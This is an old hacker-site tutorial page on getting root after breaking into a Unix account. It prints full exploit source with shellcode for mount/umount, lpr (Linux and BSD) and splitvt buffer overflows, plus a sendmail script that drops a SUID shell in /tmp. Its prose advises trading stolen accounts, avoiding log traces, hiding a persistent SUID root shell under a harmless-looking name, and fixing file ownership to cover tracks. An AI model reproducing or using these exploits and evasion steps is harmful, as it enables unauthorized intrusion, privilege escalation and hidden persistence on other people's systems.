<HTML>
<HEAD>
<TITLE>Atomicfrog.com - Hacker Resources - Getting the root
account</TITLE>
</HEAD>
<BODY TEXT="#c0c0c0" LINK="#00ff00"" VLINK="#808080" BGCOLOR="#000000">	

<B><FONT SIZE=+1>Getting the root account</FONT></B>&nbsp;
<BR>
<BR>Topics:
<BR><A HREF="#Bugs">Bugs</A>
<BR><A HREF="#Exploits">Exploits</A>
<BR>
<BR>Like I said before all you need is one account in most cases, if you cannot
get
<BR>root on the system you might want to trade it off to some irc junkie that
<BR>just wants to load a bot, for some other account or info that can help
you in
<BR>your hacking quest.&nbsp; There will be enough information here so that
if you can't
<BR>get root access, their system is well kept and probably will be kept up
in the
<BR>future.&nbsp; You can always lay the account on the side, put the info
in some kind
<BR>of log file with some good notes so that you can come back at a later time,
<BR>like right when a new exploit comes out ;)
<BR>
<BR>Try to stay out of the system until that time so that you do not risk loosing
<BR>the account.&nbsp; Remember that when you login to an account and can't
get root
<BR>you will not be able to clean the logs, and the next time the user logs
in he
<BR>might see a message that says: last login from xxx.com time:0:00 date:xx/xx/xx
<BR>
<BR>
<BR><A NAME="Bugs"></A><B><FONT SIZE=+1>Bugs</FONT></B>&nbsp;
<BR>
<BR>There are many bugs out there in different programs that you can use to
get
<BR>root.&nbsp; It might be a game installed on the system, or even the sendmail
<BR>program.&nbsp; If they do not update their programs on a regular basis,
you can
<BR>be sure you will be able to get in now, and if not, soon to come.
<BR>
<BR>I will be sure to provide the main exploits and bugs here and other less
<BR>used below in the appendix section.&nbsp; I will make sure here to give
you detailed
<BR>english terms so that you can exploit root on the system.&nbsp; But please
be sure
<BR>to read the sections below, and this manual entirely before proceeding,
to be
<BR>sure you get started in the right way and not blow you chances of having
a
<BR>long stay on the system.
<BR>
<BR>------------
<BR>
<BR><A NAME="Exploits"></A><B><FONT SIZE=+1>Exploits</FONT></B>&nbsp;
<BR>
<BR>umount/mount exploit
<BR>
<BR>Look in the /bin directory for a file called umount (or mount),
<BR>if you do not find it there do a search for the file like this:
<BR>
<BR>find / -name umount -print -xdev
<BR>
<BR>(you can look for any other file name the same way)
<BR>
<BR>Go to the directory where the file is and do: ls -al um*
<BR>
<BR>If the file has suid perm's you can probably get root.
<BR>
<BR>SUID perm's has the rws for the owner of the file which is root.&nbsp;
What you are
<BR>looking for is the (s)
<BR>
<BR>Look here:
<BR>
<BR>victim:/bin# ls -al um*
<BR>-rwsr-sr-x&nbsp;&nbsp; 1 root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
8888 Mar 21&nbsp; 1995 umount
<BR>victim:/bin#
<BR>
<BR>This machine we can get root by a compile on the file below:
<BR>
<BR>umount.c
<BR>------ cut here
<BR>
<BR>/* sno.c : Linux realpath exploit
<BR>&nbsp;* Syntax: ./sno N
<BR>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mount $WOOT
<BR>&nbsp;*&nbsp;&nbsp;&nbsp; OR&nbsp; umount $WOOT
<BR>&nbsp;* N is some number which seems to differ between 4 &amp; 8, if your
number is
<BR>&nbsp;* too big, you will get a mount error, if it is too small, it will
seg
<BR>&nbsp;* fault.&nbsp; Figure it out.&nbsp; (Sometimes N=0 for mount)
<BR>&nbsp;* If you use mount, first thing to do once you get the root shell
is rm
<BR>&nbsp;* /etc/mtab~, if this file exists you can't root with mount until
it is
<BR>&nbsp;* removed.
<BR>&nbsp;*
<BR>&nbsp;*
<BR>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;
-ReDragon
<BR>&nbsp;*/
<BR>#define SIZE 1024
<BR>
<BR>&nbsp;&nbsp; long get_esp(void)
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax\n");
<BR>&nbsp;&nbsp; }
<BR>
<BR>&nbsp;&nbsp; main(int argc, char **argv)
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp; char env[SIZE+4+1]; /* 1024 buffer + 4 byte return address
+ null byte */
<BR>&nbsp;&nbsp; int a,r;
<BR>&nbsp;&nbsp; char *ptr;
<BR>&nbsp;&nbsp; long *addr_ptr;
<BR>&nbsp;&nbsp; char execshell[] =
<BR>&nbsp;&nbsp; "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
<BR>&nbsp;&nbsp; "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
<BR>&nbsp;&nbsp; "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
<BR>&nbsp;&nbsp; char *exec_ptr = execshell;
<BR>
<BR>&nbsp;&nbsp; r=atoi(argv[1]);
<BR>&nbsp;&nbsp; ptr = env;
<BR>&nbsp;&nbsp; memcpy(ptr,"WOOT=",5); /* set environment variable to use
*/
<BR>&nbsp;&nbsp; ptr += 5;
<BR>
<BR>&nbsp;&nbsp; for(a=0;a&lt;SIZE+4-strlen(execshell)-r;a++)&nbsp; /* pad
front with NOPs */
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = 0x90;
<BR>&nbsp;&nbsp; while (*exec_ptr)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = *(exec_ptr++);
<BR>&nbsp;&nbsp; addr_ptr = (long *)ptr;
<BR>&nbsp;&nbsp; *(addr_ptr++) = get_esp()+1139;&nbsp; /* 0xbffffc01 */
<BR>
<BR>&nbsp;&nbsp; ptr = (char *) addr_ptr;
<BR>&nbsp;&nbsp; *ptr = 0; /* must end with null byte to terminate string */
<BR>&nbsp;&nbsp; putenv(env);
<BR>&nbsp;&nbsp; system("/bin/mount $WOOT");
<BR>}
<BR>
<BR>----------- cut here
<BR>
<BR>**********************************
<BR>To compile the file on the victims machine type gcc umount.c (or what ever
<BR>name you called it) -o um
<BR>
<BR>This will make a file called um that you can exec.&nbsp; Sometimes you
will need
<BR>to put a ./ in front of the file like this: ./um
<BR>
<BR>With this exploit you might also have to give it a number like:
<BR>./um 0 (or) ./um 4 ....alltheway up to 8... like this again ./um 8
<BR>
<BR>
<BR>*************************************
<BR>If you fail here you might want to try lpr.&nbsp; Look in the /usr/bin
for lpr and
<BR>see if it is SUID, if it is lpr should work if it is up on the system.
<BR>
<BR>ls -l lpr
<BR>
<BR>Ok it had suid perm's?&nbsp; Use this script
<BR>
<BR>*************************************
<BR>lpr.linux.c
<BR>------------- cut here
<BR>
<BR>#include &lt;stdio.h>
<BR>#include &lt;stdlib.h>
<BR>#include &lt;unistd.h>
<BR>
<BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
50
<BR>#define BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1023
<BR>
<BR>long get_esp(void)
<BR>{
<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax\n");
<BR>}
<BR>
<BR>void main()
<BR>{
<BR>&nbsp;&nbsp; char *buff = NULL;
<BR>&nbsp;&nbsp; unsigned long *addr_ptr = NULL;
<BR>&nbsp;&nbsp; char *ptr = NULL;
<BR>
<BR>&nbsp;&nbsp; u_char execshell[] = "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
"\xd7\xff\xff\xff/bin/sh";
<BR>&nbsp;&nbsp; int i;
<BR>
<BR>&nbsp;&nbsp; buff = malloc(4096);
<BR>&nbsp;&nbsp; if(!buff)
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("can't allocate memory\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);
<BR>&nbsp;&nbsp; }
<BR>&nbsp;&nbsp; ptr = buff;
<BR>&nbsp;&nbsp; memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
<BR>&nbsp;&nbsp; ptr += BUFFER_SIZE-strlen(execshell);
<BR>&nbsp;&nbsp; for(i=0;i &lt; strlen(execshell);i++)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = execshell[i];
<BR>&nbsp;&nbsp; addr_ptr = (long *)ptr;
<BR>&nbsp;&nbsp; for(i=0;i&lt;2;i++)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
<BR>&nbsp;&nbsp; ptr = (char *)addr_ptr;
<BR>&nbsp;&nbsp; *ptr = 0;
<BR>&nbsp;&nbsp; execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
<BR>}
<BR>---------- cut here
<BR>
<BR>***************************
<BR>Here is the BSD version
<BR>***************************
<BR>
<BR>lpr.bsd.c
<BR>--------------------------------------------------------- cut here
<BR>#include &lt;stdio.h>
<BR>#include &lt;stdlib.h>
<BR>#include &lt;unistd.h>
<BR>
<BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
50
<BR>#define BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
1023
<BR>
<BR>long get_esp(void)
<BR>{
<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax\n");
<BR>}
<BR>
<BR>void main()
<BR>{
<BR>&nbsp;&nbsp; char *buff = NULL;
<BR>&nbsp;&nbsp; unsigned long *addr_ptr = NULL;
<BR>&nbsp;&nbsp; char *ptr = NULL;
<BR>
<BR>&nbsp;&nbsp; char execshell[] =
<BR>&nbsp;&nbsp; "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
<BR>&nbsp;&nbsp; "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
<BR>&nbsp;&nbsp; "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
<BR>&nbsp;&nbsp; "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
<BR>
<BR>&nbsp;&nbsp; int i;
<BR>
<BR>&nbsp;&nbsp; buff = malloc(4096);
<BR>&nbsp;&nbsp; if(!buff)
<BR>&nbsp;&nbsp; {
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("can't allocate memory\n");
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);
<BR>&nbsp;&nbsp; }
<BR>&nbsp;&nbsp; ptr = buff;
<BR>&nbsp;&nbsp; memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
<BR>&nbsp;&nbsp; ptr += BUFFER_SIZE-strlen(execshell);
<BR>&nbsp;&nbsp; for(i=0;i &lt; strlen(execshell);i++)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = execshell[i];
<BR>&nbsp;&nbsp; addr_ptr = (long *)ptr;
<BR>&nbsp;&nbsp; for(i=0;i&lt;2;i++)
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
<BR>&nbsp;&nbsp; ptr = (char *)addr_ptr;
<BR>&nbsp;&nbsp; *ptr = 0;
<BR>&nbsp;&nbsp; execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
<BR>}
<BR>--------- cut here
<BR>
<BR>Now just compile it and chmod it +x, and run it.
<BR>
<BR>Watch this one on the group file owner.&nbsp; Any file you copy will have
<BR>group owner as lp, make sure you chgrp root filename on any file you
<BR>write.&nbsp; Always be watching the user groups with ls -l and if you changed
<BR>any change them back like this:
<BR>
<BR>chgrp groupname filename
<BR>
<BR>It is a good idea to use this exploit ONLY to get the root access, then
<BR>just copy bash or sh to another file name on the system somewhere and make
<BR>it root root, suid:&nbsp; Group owner and File owner root, then chmod it
+s
<BR>
<BR>This will give you root access in the future as gid and uid root, without
using
<BR>the lp group.&nbsp; Make sure you name it something that looks like it
should be
<BR>running as a root process somewhere ;)
<BR>
<BR>*****************
<BR>Here is another that is still around after a while, look for SUID perm's
<BR>on a file /usr/bin/splitvt
<BR>
<BR>If it has suid perm's use this file below, but be sure to read the directions
<BR>after the exploit:
<BR>****************************************
<BR>sp.c
<BR>-------------------------------------------- cut here
<BR>/*
<BR>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Avalon Security Research
<BR>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Release 1.3
<BR>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (splitvt)
<BR>&nbsp;*
<BR>&nbsp;* Affected Program: splitvt(1)
<BR>&nbsp;*
<BR>&nbsp;* Affected Operating Systems: Linux 2-3.X
<BR>&nbsp;*
<BR>&nbsp;* Exploitation Result: Local users can obtain superuser privileges.
<BR>&nbsp;*
<BR>&nbsp;* Bug Synopsis: A stack overflow exists via user defined unbounds
checked
<BR>&nbsp;* user supplied data sent to a sprintf().
<BR>&nbsp;*
<BR>&nbsp;* Syntax:
<BR>&nbsp;* crimson~$ cc -o sp sp.c
<BR>&nbsp;* crimson~$ sp
<BR>&nbsp;* bash$ sp
<BR>&nbsp;* bash$ splitvt
<BR>&nbsp;* bash# whoami
<BR>&nbsp;* root
<BR>&nbsp;*
<BR>&nbsp;* Credit: Full credit for this bug (both the research and the code)
<BR>&nbsp;* goes to Dave G. &amp; Vic M.&nbsp; Any questions should be directed
to
<BR>&nbsp;* mcpheea@cadvision.com .
<BR>&nbsp;*
<BR>&nbsp;* ----------------------------------------------------------------------------
<BR>&nbsp;*/
<BR>
<BR>
<BR>long get_esp(void)
<BR>{
<BR>__asm__("movl %esp,%eax\n");
<BR>}
<BR>main()
<BR>{
<BR>&nbsp; char eggplant[2048];
<BR>&nbsp; int a;
<BR>&nbsp; char *egg;
<BR>&nbsp; long *egg2;
<BR>&nbsp; char realegg[] =
<BR>"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
<BR>"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
<BR>"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
<BR>&nbsp; char *eggie = realegg;
<BR>
<BR>&nbsp; egg = eggplant;
<BR>
<BR>&nbsp; *(egg++) = 'H';
<BR>&nbsp; *(egg++) = 'O';
<BR>&nbsp; *(egg++) = 'M';
<BR>&nbsp; *(egg++) = 'E';
<BR>&nbsp; *(egg++) = '=';
<BR>
<BR>&nbsp; egg2 = (long *)egg;
<BR>
<BR>&nbsp; for (a=0;a&lt;(256+8)/4;a++) *(egg2++) = get_esp() + 0x3d0 + 0x30;
<BR>
<BR>&nbsp; egg=(char *)egg2;
<BR>
<BR>&nbsp; for (a=0;a&lt;0x40;a++) *(egg++) = 0x90;
<BR>
<BR>&nbsp; while (*eggie)
<BR>&nbsp;&nbsp;&nbsp; *(egg++) = *(eggie++);
<BR>&nbsp; *egg = 0; /* terminate eggplant! */
<BR>
<BR>&nbsp; putenv(eggplant);
<BR>
<BR>&nbsp; system("/bin/bash");
<BR>}
<BR>
<BR>-------------- cut here
<BR>
<BR>Ok this is how splitvt works:
<BR>
<BR>1. Compile the file
<BR>2. Run the sp file
<BR>3. Run splitvt
<BR>
<BR>Before you run the file:&nbsp;&nbsp; whoami {press enter}
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
username
<BR>After you run the exploit: whoami
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
root
<BR>
<BR>*******************************************************
<BR>
<BR>Now if all of these have not got you root, try sm.sh.&nbsp; This is a sendmail
<BR>bug that works with 8.73 to 8.83 (maybe some others)
<BR>
<BR>Here is the script:
<BR>
<BR>sm.sh
<BR>---------- cut here
<BR>echo&nbsp;&nbsp; 'main()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>smtpd.c
<BR>echo&nbsp;&nbsp; '{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>smtpd.c
<BR>echo&nbsp;&nbsp; '&nbsp; setuid(0); setgid(0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>smtpd.c
<BR>echo&nbsp;&nbsp; '&nbsp; system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>smtpd.c
<BR>echo&nbsp;&nbsp; '}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>smtpd.c
<BR>echo&nbsp;&nbsp; 'main()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>leshka.c
<BR>echo&nbsp;&nbsp; '{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>leshka.c
<BR>echo&nbsp;&nbsp; '&nbsp; execl("/usr/sbin/sendmail","/tmp/smtpd",0);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>leshka.c
<BR>echo&nbsp;&nbsp; '}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
'>>leshka.c
<BR>
<BR>cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
<BR>./leshka
<BR>kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]"
"\n"|head -n 1`
<BR>rm leshka.c leshka smtpd.c /tmp/smtpd
<BR>cd /tmp
<BR>sh
<BR>------------ cut here
<BR>
<BR>Just chmod the file +x like this
<BR>
<BR>chmod +x sm.sh
<BR>
<BR>1. Run the file
<BR>2. It will take you to the /tmp directory
<BR>3. type ls -l and see if you have a SUID sh file there, if you do, type
<BR>&nbsp;&nbsp; whoami, if not root, run the file ./sh, now see if you are
root ;)
<BR>
<BR>I will add many more scripts in the appendix, but these should be the best
<BR>at this time to get root access on linux or BSD, if you need another BSD
<BR>exploit try the crontab exploit for BSD in the appendix.
<BR>****************************************************************************

<BR>
<CENTER><A HREF="http://www.atomicfrog.com/archives">Back to
Index</a></CENTER>
</BODY>
</HTML>
